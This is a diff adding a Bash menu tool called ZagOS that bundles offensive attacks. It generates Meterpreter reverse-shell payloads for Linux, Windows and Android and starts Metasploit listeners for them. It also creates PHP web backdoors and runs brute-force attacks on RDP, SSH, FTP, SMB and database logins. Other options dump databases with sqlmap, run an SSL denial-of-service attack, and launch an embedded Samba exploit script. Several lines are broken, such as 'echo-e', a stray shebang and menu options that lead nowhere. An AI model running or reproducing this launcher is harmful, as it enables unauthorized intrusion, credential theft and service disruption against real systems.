@@ -1,0 +1,708 @@
+#This colour
+cyan='\e[0;36m'
+lightcyan='\e[96m'
+green='\e[0;32m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+Escape="\033";
+white="${Escape}[0m";
+RedF="${Escape}[31m";
+GreenF="${Escape}[32m";
+LighGreenF="${Escape}[92m"
+YellowF="${Escape}[33m";
+BlueF="${Escape}[34m";
+CyanF="${Escape}[36m";
+Reset="${Escape}[0m";
+# resize terminal window
+resize -s 50 90 > /dev/null
+#Options
+path=`pwd` # Path
+payload="" # payload
+name="\e[1;34mupdate-zagos" #Name
+VeR="\e[1;31mV1.0" # Version
+Author="\e[1;31mupdate-zagos-Security" #author
+Website="\e[96mwww.dev-labs.co" #web
+gith="\e[1;37mwww.github.com/update-zagos" #Github
+chan="\e[1;32mwww.youtube.com/c/Professional update-zagos" #CHannel
+#some variables
+DEFAULT_ROUTE=$(ip route show default | awk '/default/ {print $3}')
+MYIP=$(ip route show | awk '(NR == 2) {print $9}')
+# Check root
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
+sleep 1
+echo ""
+echo -e $lightgreen"[*] Thanks For Using update-zagos :)"
+exit
+}
+clear
+# check internet
+function checkinternet {
+  ping -c 1 google.com > /dev/null
+  if [[ "$?" != 0 ]]
+  then
+    echo  " Checking For Internet: FAILED
+    This Script Needs An Active Internet Connection"
+    echo " TOr Will Now Exit"
+    echo && sleep 2
+    kexit
+  else
+    echo -e $blue  " -----------------------------------"
+    echo -e $green " Checking For Internet: $red CONNECTED"
+    echo -e $blue  " -----------------------------------"
+  fi
+}
+checkinternet
+sleep 1
+#updating your distro
+echo
+echo -e $blue  "-------------------"
+echo -e $green "[ ✔ ] system found."
+echo -e $blue  "-------------------"
+echo -e $blue
+sudo cat /etc/issue.net
+#check dependencies existence
+echo -e $blue ""
+echo "® Checking dependencies configuration ®"
+sleep 1
+#installer tool 
+lnk=$?
+if [ $lnk ==  "0" ];then
+dir=`pwd` 
+scrp="cd $path && ./update-zagos"
+rm -f /usr/local/sbin/update-zagos
+touch /usr/local/sbin/update-zagos
+echo "#!/bin/bash" > /usr/local/sbin/update-zagos
+echo $scrp >> /usr/local/sbin/update-zagos
+cp $path/config/update-zagos.desktop /usr/share/applications/update-zagos.desktop
+cp $path/icons/update-zagos.png /usr/share/icons/update-zagos.png
+chmod +x /usr/local/sbin/update-zagos
+chmod +x update-zagos
+echo -e $red "update-zagos Is Installed In Your System And in Your Application Menu"
+fi
+#check if xterm is installed
+which xterm > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Xterm.............................【\e[1;33mFound\e[0m】"
+which xterm > /dev/null 2>&1
+sleep 1
+else
+echo ""
+echo -e $red "[ X ] xterm -> not found! "
+sleep 1
+echo -e $yellow "[ ! ] Installing Xterm "
+sleep 1
+echo -e $green ""
+sudo apt-get install xterm -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which xterm > /dev/null 2>&1
+fi
+# check if xsser is installed
+which xsser > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] xsser..............【\e[1;33mFound\e[0m】"
+which xsser > /dev/null 2>&1
+sleep 1
+else
+echo -e $red "[ X ] xsser -> not found "
+echo -e $yellow "[ ! ] Installing xsser "
+sudo apt-get install xsser -y
+echo -e $blue "[ ✔ ] Done installing ...."
+which xsser > /dev/null 2>&1
+sleep 1
+fi
+# check if Crowbar is installed
+which Crowbar > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Crowbar..............【\e[1;33mFound\e[0m】"
+which Crowbar > /dev/null 2>&1
+sleep 1
+else
+echo -e $red "[ X ] Crowbar -> not found "
+echo -e $yellow "[ ! ] Installing Crowbar "
+sudo apt-get install crowbar -y
+echo -e $blue "[ ✔ ] Done installing ...."
+which Crowbar > /dev/null 2>&1
+sleep 1
+fi
+clear
+echo -e "\e[1;32m    -----------------------------------------"
+ech-eo  "          < ! update-zagos-Framework RUning  LINUX TOOLS ! >"
+echo -e "            ----------------------------------------- "
+echo-e  " ▄███████▄     ▄████████    ▄██████▄        ▄██████▄     ▄████████ "
+echo-e  "██▀     ▄██   ███    ███   ███    ███      ███    ███   ███    ███ "
+echo-e  "      ▄███▀   ███    ███   ███    █▀       ███    ███   ███    █▀  "
+echo-e  " ▀█▀▄███▀▄▄   ███    ███  ▄███             ███    ███   ███        "
+echo-e  "  ▄███▀   ▀ ▀███████████ ▀▀███ ████▄       ███    ███ ▀███████████ "
+echo-e  "▄███▀         ███    ███   ███    ███      ███    ███          ███ "
+echo-e  "███▄     ▄█   ███    ███   ███    ███      ███    ███    ▄█    ███ "
+echo-e  " ▀████████▀   ███    █▀    ████████▀        ▀██████▀   ▄████████▀  $VeR"
+echo-e  "                                                                   "
+echo -e "                   < ! ZagOS-Framework ! > "
+echo -e "              ╔────────────────────────────╗ "
+echo -e "              | Created By ZagOS-Security  |  "
+echo -e "              ╚────────────────────────────╝ "
+# directory
+directory="$path/Backdoor"
+if [ ! -d "$directory" ]; then
+    echo "Creating the Backdoor directory..."
+    mkdir $directory
+        sleep 1
+fi
+directory="$path/wordlist"
+if [ ! -d "$directory" ]; then
+    echo "Creating the wordlist directory..."
+    mkdir $directory
+        sleep 1
+fi
+# directory
+directory="$path/payload"
+if [ ! -d "$directory" ]; then
+    echo "Creating the payload directory..."
+    mkdir $directory
+        sleep 1
+fi
+sleep 2
+# Function tool
+function ssl()
+{
+    sslscan $target 
+}
+function webac()
+{
+    webacoo -t -u $target
+}
+function weba()
+{
+    webacoo -g -o $path/Backdoor/$we.php
+}
+function weev()
+{
+    weevely generate $wee $path/Backdoor/$we.php 
+}
+function weeve()
+{
+    weevely $target $wee
+}
+function sql()
+{ 
+    sqlmap -u $target --dbs    
+}
+function tab()
+{
+    sqlmap -u $target -D $name --tables
+}
+function colu()
+{
+    sqlmap -u $target -D $name -T $nam --columns
+}
+function dum()
+{
+    sqlmap -u $target -D $name -T $nam -C $na --dump 
+}
+function linux()
+{
+    xterm -T "☢ CREATE PAYLOAD LINUX ☢" -e msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhst LPORT=$lprt -f elf -o $path/payload/$name.elf
+}
+function wind()
+{
+    xterm -T "☢ CREATE PAYLOAD WINDOWS ☢" -e msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -f exe -o $path/payload/$name.exe
+}
+function android()
+{
+     xterm -T "☢ CREATE PAYLOAD ANDROID ☢" -e msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhst LPORT=$lprt -a dalvik --platform android R -o $path/payload/$name.apk
+}
+function remotedp()
+{
+     hydra -t 4 -V -f -L $usr -P $pass rdp://$ip
+}
+function post()
+{
+    hydra -L $usr -P $pass postgres://$ip
+}
+function mys()
+{
+    hydra -L $usr -P $pass mysql://$ip
+}
+function rlogin()
+{
+    hydra -L $usr -P $pass rlogin://$ip
+}
+function microds()
+{
+    hydra -L $usr -P $pass smb://$ip
+}
+function hydr()
+{
+     hydra -L $usr -P $pass ftp://$ip
+}
+function hyd()
+{
+    hydra -L $usr -P $pass ssh://$ip
+}
+function hy()
+{
+    hydra -L $usr -P $pass telnet://$ip
+}
+function corw()
+{
+     crowbar -b rdp -U $usr -C $pass -s $ip/24 -v
+}
+function us()
+{
+    wpscan --url $target --enumerate u
+}
+function md()
+{
+    medusa -h $ip -U $usr -P $pass -M http
+}
+function med()
+{
+    medusa -h $ip -u admin -P $pass -M telnet
+}
+function medu()
+{
+    medusa -h $ip -U $usr -P $pass -M ssh
+}
+function medus()
+{
+    medusa -h $ip -U $usr -P $pass -M ftp
+}
+function cew()
+{
+    cewl -w $path/wordlist/word.txt -d 1 -m 3 $target
+}
+function crun()
+{
+     crunch 1 5 abcdefg0123456789 -o $path/wordlist/list.txt
+}
+function xss()
+{
+    xsser -d "$dork" --De google
+}
+function uni()
+{
+    uniscan -u $target  -qweds
+}
+function dirr()
+{
+    dirb $target
+}
+function skip()
+{
+    skipfish -o 202 $target
+}
+function wap()
+{
+    wapiti $target
+}
+function what()
+{
+    whatweb $target
+}
+function caiso()
+{
+    cge.pl $ip 3
+}
+function thc-ssl()
+{
+    thc-ssl-dos $ip --accept
+}
+function sieg()
+{
+    siege -v $target
+}
+function wp()
+{
+    wpscan --url $target
+}
+function joom()
+{
+    joomscan -u $target
+}
+function golis()
+{
+    golismero scan $target
+}
+function nikt()
+{
+    nikto -h $target
+}
+function wafw()
+{
+    wafw00f $target
+}
+function search()
+{
+    searchsploit $choise
+}
+function lyn()
+{
+    lynis audit system
+}
+function mass()
+{
+    masscan -p22,80,445 $ip
+}
+function dmi()
+{
+    dmitry $target
+}
+function the()
+{
+    theharvester -d $target -l 500 -b google
+}
+function map()
+{
+     nmap -sS $ip
+}
+function web()
+{
+    whatweb $target
+}
+function dns()
+{
+    dnsmap $target
+}
+function arp()
+{
+    arping -c 3 $ip
+}
+function we()
+{
+    echo -e $red ""
+    echo "-------- Name Backdoor ------"
+    read -p "Name:~# " we
+}
+function wee()
+{
+    echo -e $red ""
+    echo "-------- Password Backdoor ------"
+    read -p "Password:~# " wee
+}
+function lhst()
+{
+    echo -e $red ""
+    echo "--------ENTRE LHOST ------"
+    read -p "LHOST:~# " lhst
+}
+function exe()
+{
+	echo -e -n "$white File Path.exe :~# $red"
+    read -e exe 
+}
+function name()
+{
+
+    echo -e $green ""
+    echo "--------Your Name Payload ------"
+    read -p "Name:~# " name
+}
+function nam()
+{
+
+    echo -e $green ""
+    echo "--------Enter Name ------"
+    read -p "Name:~# " nam
+}
+function na()
+{
+
+    echo -e $green ""
+    echo "--------Enter Name ------"
+    read -p "Name:~# " na
+}
+function lprt()
+{
+
+    echo -e $green ""
+    echo "--------Entre LPORT ------"
+    read -p "LPORT:~# " lprt
+}
+function psql()
+{
+    xterm -T "+ SERVICE POSTGRESQL START +" -e service postgresql start 
+}
+function psq()
+{
+    xterm -T "+ SERVICE POSTGRESQL STOP +" -e service postgresql stop 
+}
+function usr()
+{
+    echo -e -n "$white User Wordlist Path :~# $red"
+    read -e usr
+}
+function choise()
+{
+    echo -e -n "$white Your Choise :~# $red"
+    read -e choise
+}
+function ip()
+{
+    echo -e -n "$white Adress ip :~# $red"
+    read -e ip
+}
+function dork()
+{
+    echo -e -n "$white Dork Entre :~# $red"
+    read -e dork
+}
+function target()
+{
+    echo -e -n "$white Target :~# $red"
+    read -e target
+}
+function pass()
+{
+    echo -e -n "$red Password Wordlist Path :~# $lightgreen"
+    read -e pass
+}
+function port()
+{
+    echo -e -n "$white Port :~# $red"
+    read -e port
+}
+function msf_listener()
+{
+    echo "use exploit/multi/handler" >> msf.rc 
+    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> msf.rc 
+    echo "set LHOST $lhst" >> msf.rc 
+    echo "set LPORT $lprt" >> msf.rc
+    echo "exploit" >> msf.rc  
+    xterm -T "☢ HACKING WINDOWS ☢" -e msfconsole -r msf.rc
+}
+function msf_linux()
+{
+    echo "use exploit/multi/handler" >> linux.rc 
+    echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> linux.rc 
+    echo "set LHOST $lhst" >> linux.rc 
+    echo "set LPORT $lprt" >> linux.rc   
+    echo "exploit" >> linux.rc  
+    xterm -T "☢ HACKING LINUX ☢" -e msfconsole -r linux.rc
+}
+function msf_android()
+{
+    echo "use exploit/multi/handler" >> android.rc 
+    echo "set PAYLOAD android/meterpreter/reverse_tcp" >> android.rc 
+    echo "set LHOST $lhst" >> android.rc 
+    echo "set LPORT $lprt" >> android.rc   
+    echo "exploit" >> android.rc  
+    xterm -T "☢ HACKING ANDROID ☢" -e msfconsole -r android.rc   
+}
+function clean()
+    while true; do
+    read -p "[*] Are you sure you want to clean folders? [y/N] = " yn
+    case $yn in
+    [Yy]* ) rm -rf $path/Backdoor > /dev/null 2>&1;rm -rf $path/wordlist > /dev/null 2>&1;rm -rf $path/payload > /dev/null 2>&1;echo " Files removed [ ✔ ]";exit;;
+    [Nn]* ) echo "";echo "Good Bye!";echo "";exit;;
+    esac
+done
+clear
+#banner head
+function main_menu()
+{
+       while :
+    do
+echo -e "           Gateway:\033[32m$DEFAULT_ROUTE |$white My-Ip:$red$MYIP"
+echo -e "██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗"
+echo -e "██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝"
+echo -e "██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗  "
+echo -e "██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  "
+echo -e "██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗"
+echo -e "╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝"
+echo -e "                                                                                    "
+echo -e "                                                                                    " 
+echo -e "                                                                                    "
+echo -e "                                                                                    "
+echo -e "            ------'        $red   "
+echo -e "$lightgreen 1) $red ✔ ravenforce and Xss              $lightgreen 2) $red ✔ About"
+echo -e "$lightgreen 3) $red ✔ Web Brute_Force           $lightgreen 4) $red ✔ DoS Attack Simulation"
+echo -e "$lightgreen 0) $red ✔ Exit "
+echo -n -e "$lightgreen root@ZagOS:~#: $red"
+read -e joker
+case $joker in
+'1')
+###############################
+#####    update_zagos    #####
+###############################
+   clear
+   echo -e """
+   ▄███████▄     ▄████████    ▄██████▄        ▄██████▄     ▄████████ 
+  ██▀     ▄██   ███    ███   ███    ███      ███    ███   ███    ███ 
+        ▄███▀   ███    ███   ███    █▀       ███    ███   ███    █▀  
+   ▀█▀▄███▀▄▄   ███    ███  ▄███             ███    ███   ███        
+    ▄███▀   ▀ ▀███████████ ▀▀███ ████▄       ███    ███ ▀███████████ 
+  ▄███▀         ███    ███   ███    ███      ███    ███          ███ 
+  ███▄     ▄█   ███    ███   ███    ███      ███    ███    ▄█    ███ 
+   ▀████████▀   ███    █▀    ████████▀        ▀██████▀   ▄████████▀ 
+    $red 1 $white) $lightgreen ravenforce and Xss
+    $red 2 $white) $lightgreen ravenforce and MSF
+    $red 0 $white) $lightgreen back
+    """
+   echo ""
+   echo -e -n "$lightgreen root@ZagOS:~#: $red"
+   read -e joker2
+   case $joker2 in
+    '1')
+    echo ""
+  #!/bin/bash
+
+# RavenForce - أداة اختبار اختراق كلمات المرور والفحص المتقدم
+# تجمع بين Hydra و John the Ripper و Nmap و Metasploit مع ميزات متقدمة
+
+# التحقق من تثبيت الأدوات المطلوبة
+REQUIRED_TOOLS=("hydra" "john" "nmap" "msfconsole")
+for TOOL in "${REQUIRED_TOOLS[@]}"; do
+    if ! command -v $TOOL &> /dev/null; then
+        echo "[!] الأداة $TOOL غير مثبتة. يرجى تثبيتها أولاً."
+        exit 1
+    fi
+done
+
+# طلب إدخال بيانات الاختبار
+read -p "أدخل عنوان IP الهدف:~#: " TARGET_IP
+read -p "أدخل نوع الخدمة (SSH, FTP, RDP, HTTP): " SERVICE
+read -p "أدخل مسار قائمة كلمات المرور: " WORDLIST
+
+# تشغيل Nmap لفحص المنافذ والخدمات
+echo "[*] تشغيل Nmap لفحص المنافذ المفتوحة..."
+nmap -sV -Pn "$TARGET_IP" -oN nmap_scan.txt
+
+# تشغيل Hydra لاختبار كلمات المرور عبر الشبكة
+echo "[*] بدء اختبار Hydra على $SERVICE..."
+hydra -L users.txt -P "$WORDLIST" "$TARGET_IP" "$SERVICE" -V -o hydra_results.txt
+
+# تشغيل John the Ripper لاختبار كلمات المرور المشفرة
+echo "[*] تشغيل John the Ripper لتحليل الهاشات..."
+john --wordlist="$WORDLIST" hashes.txt --format=NT
+
+# محاولة استغلال الثغرات باستخدام Metasploit
+echo "[*] محاولة استغلال الثغرات عبر Metasploit..."
+echo "use exploit/multi/samba/usermap_script" > metasploit_script.rc
+echo "set RHOSTS $TARGET_IP" >> metasploit_script.rc
+echo "exploit" >> metasploit_script.rc
+msfconsole -r metasploit_script.rc -o metasploit_results.txt
+
+# حفظ التقرير
+REPORT_FILE="ravenforce_report_$(date +%F).txt"
+echo "[*] حفظ النتائج في $REPORT_FILE"
+echo "--- تقرير RavenForce ---" > "$REPORT_FILE"
+echo "نتائج فحص Nmap:" >> "$REPORT_FILE"
+cat nmap_scan.txt >> "$REPORT_FILE"
+echo "\nنتائج Hydra:" >> "$REPORT_FILE"
+cat hydra_results.txt >> "$REPORT_FILE"
+echo "\nنتائج John the Ripper:" >> "$REPORT_FILE"
+john --show hashes.txt >> "$REPORT_FILE"
+echo "\nنتائج Metasploit:" >> "$REPORT_FILE"
+cat metasploit_results.txt >> "$REPORT_FILE"
+
+echo "[*] العملية اكتملت! تم حفظ التقرير في $REPORT_FILE"
+# تحديث النظام
+
+    echo -e $green "【!】 Main Menu【!】"
+    read -p "pess any key to return ..."
+    clear
+    ;;
+    '2')
+    echo ""
+    python3 penetration_testing.py
+ echo -e $green "【!】 Main Menu【!】"
+    read -p "pess any key to return ..."
+    clear
+    ;;   
+    '0')
+    clear
+    ;;
+  esac;;
+'2')
+   clear
+   echo -e $lightgreen """
+_______  ______   _______          _________
+(  ___  )(  ___ \ (  ___  )|\     /|\__   __/
+| (   ) || (   ) )| (   ) || )   ( |   ) (
+| (___) || (__/ / | |   | || |   | |   | |
+|  ___  ||  __ (  | |   | || |   | |   | |\e[1;31m
+| (   ) || (  \ \ | |   | || |   | |   | |
+| )   ( || )___) )| (___) || (___) |   | |
+|/     \||/ \___/ (_______)(_______)   )_(\e[1;32m
+╔────────────────────────────────────────────────────────────────╗
+● NAME    : ZagOS                                                |
+● VERSION : V1.0                                                 |
+● AUTHOR  : ZagOS-Security                                       |
+● WEBSITE : http://dev-labs.co                                   |
+● GITHUB  : https://github.com/ZagOS                             |\e[1;96m
+● TWITTER : https://twitter.com/ZagOS                            |
+● YOUTUBE : https://www.youtube.com/c/ZagOS                      |
+● FACE Pg : https://facebook.com/ZagOS.linux.pentesting.tutorials|
+╚────────────────────────────────────────────────────────────────╝
+● Credits To:                 Zakarya Commondo                   |
+╚────────────────────────────────────────────────────────────────╝
+   """
+    echo -e $green "【!】 Main Menu【!】"
+    read -p "pess any key to return ..."
+    clear
+    ;;
+    
+    '3')
+    clear
+    echo -e """\e[1;37m
+8   8  8                8""""8                8""""8                                       
+8   8  8 eeee eeeee     8    8 eeeee eeeee    8    8 eeeee eeeee e   e    e eeeee e  eeeee 
+8e  8  8 8    8   8     8eeee8 8   8 8   8    8eeee8 8   8 8   8 8   8    8 8   " 8  8   " 
+88  8  8 8eee 8eee8e    88   8 8eee8 8eee8    88   8 8e  8 8eee8 8e  8eeee8 8eeee 8e 8eeee 
+88  8  8 88   88   8    88   8 88    88       88   8 88  8 88  8 88    88      88 88    88 
+88ee8ee8 88ee 88eee8    88   8 88    88       88   8 88  8 88  8 88eee 88   8ee88 88 8ee88  
+$red 1 $white) $lightgreen Brute_Force V1.0    $red 2 $white) $lightgreen BruteX
+$red 0 $white) $lightgreen Back
+
+        """
+      echo ""
+  echo -e -n "$white root@ZagOS:~#: $red"
+  read -e joker2
+  case $joker2 in
+   '1')
+    python3 Brute_Force.py
+    echo -e $green "【!】 Main Menu【!】"
+    read -p "pess any key to return ..."
+    clear
+    ;;
+    '0')
+    clear
+    ;;
+esac;;
+    
+    
+'7')
+    clear
+    echo -e """\e[1;31m
+                                                                               
+  ####  #      ######   ##   #    #    #    # #####     ###### # #      ###### 
+ #    # #      #       #  #  ##   #    #    # #    #    #      # #      #      
+ #      #      #####  #    # # #  #    #    # #    #    #####  # #      #####  \e[1;96m
+ #      #      #      ###### #  # #    #    # #####     #      # #      #     
+ #    # #      #      #    # #   ##    #    # #         #      # #      #      
+  ####  ###### ###### #    # #    #     ####  #         #      # ###### ###### 
+                                                                               
+                              -----------------------------\e[1;96m
+                              -CLEAN Files Created removed-
+                              -----------------------------\e[1;31m                                                               
+            """
+    clean 
+    ;;
+'0')
+  echo -e $red " Good Bye !!"
+  echo
+  exit 0
+  ;;
+       esac
+    done
+}
+main_menu
